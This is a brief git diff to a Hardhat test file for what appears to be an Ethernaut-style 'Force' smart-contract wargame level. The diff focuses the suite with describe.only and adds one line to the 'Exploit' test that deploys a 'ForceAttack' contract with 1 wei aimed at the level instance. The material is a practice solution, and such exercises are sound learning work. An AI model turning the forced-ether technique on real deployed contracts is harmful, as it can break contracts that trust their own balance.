@@ -3,7 +3,7 @@ const { ethers } = require("hardhat");
 
 const { setupLevel } = require("./utils");
 
-describe("Force", async function () {
+describe.only("Force", async function () {
     let deployer;
     let player;
     let factory;
@@ -18,7 +18,7 @@ describe("Force", async function () {
     });
 
     it("Exploit", async function () {
-
+        await (await ethers.getContractFactory("ForceAttack")).deploy(instance.address, { value: 1 });
     });
 
     after(async function () {
